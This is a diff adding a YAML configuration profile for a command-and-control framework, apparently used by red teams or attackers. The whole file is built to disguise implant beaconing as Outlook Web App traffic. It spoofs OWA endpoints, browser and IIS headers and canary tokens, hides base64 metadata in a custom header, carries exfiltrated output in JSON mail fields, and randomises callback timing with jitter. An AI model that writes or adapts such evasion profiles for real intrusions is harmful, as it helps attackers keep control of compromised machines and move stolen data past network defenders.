@@ -1,0 +1,84 @@
+# Outlook Web App Malleable Profile
+# Disguises C2 traffic as Outlook OWA activity
+
+name: "outlook"
+description: "Outlook Web App and Exchange traffic disguise"
+
+http_get:
+  uri:
+    - "/owa/service.svc"
+    - "/owa/service.svc?action=GetMailFolders"
+    - "/owa/service.svc?action=FindItem"
+  verb: "GET"
+
+  client:
+    headers:
+      Accept: "application/json"
+      Accept-Encoding: "gzip, deflate"
+      Accept-Language: "en-US,en;q=0.9"
+      Connection: "keep-alive"
+      Host: "{callback_host}"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      X-OWA-Canary: "{canary_token}"
+      X-OWA-UrlPostData: ""
+      X-Requested-With: "XMLHttpRequest"
+    metadata:
+      encoding:
+        - base64
+      location: "header"
+      name: "X-OWA-ActionId"
+
+  server:
+    headers:
+      Cache-Control: "private"
+      Content-Encoding: "gzip"
+      Content-Type: "application/json; charset=utf-8"
+      Server: "Microsoft-IIS/10.0"
+      X-AspNet-Version: "4.0.30319"
+      X-Powered-By: "ASP.NET"
+      X-FEServer: "{server_name}"
+    output:
+      encoding:
+        - base64
+      container: "json"
+      path: "Body.Items[0].Subject"
+
+http_post:
+  uri:
+    - "/owa/service.svc?action=SendItem"
+    - "/owa/service.svc?action=CreateItem"
+  verb: "POST"
+
+  client:
+    headers:
+      Accept: "application/json"
+      Content-Type: "application/json; charset=utf-8"
+      X-OWA-Canary: "{canary_token}"
+      X-OWA-UrlPostData: ""
+    id:
+      encoding:
+        - base64
+      location: "uri"
+      parameter: "ItemId"
+    output:
+      encoding:
+        - gzip
+        - base64
+      location: "body"
+      container: "json"
+      path: "Items[0].Body.Content"
+
+  server:
+    headers:
+      Content-Type: "application/json"
+      Server: "Microsoft-IIS/10.0"
+    output:
+      encoding:
+        - base64
+      container: "json"
+      path: "Diagnostics"
+
+jitter:
+  min: 45
+  max: 120
+  percent: 25
